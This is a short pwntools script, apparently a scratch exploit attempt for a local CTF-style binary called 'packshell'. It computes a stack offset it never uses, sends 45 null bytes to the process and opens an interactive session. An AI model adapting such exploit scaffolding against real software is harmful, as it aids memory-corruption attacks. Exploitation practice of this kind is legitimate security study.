#!/opt/homebrew/bin/python3

from pwn import *

offset = 0x7fffffffe310 - 0x7fffffffe33c
p = process(["./packshell",  "0"])
p.sendline(bytes(1 * 45))
p.interactive()
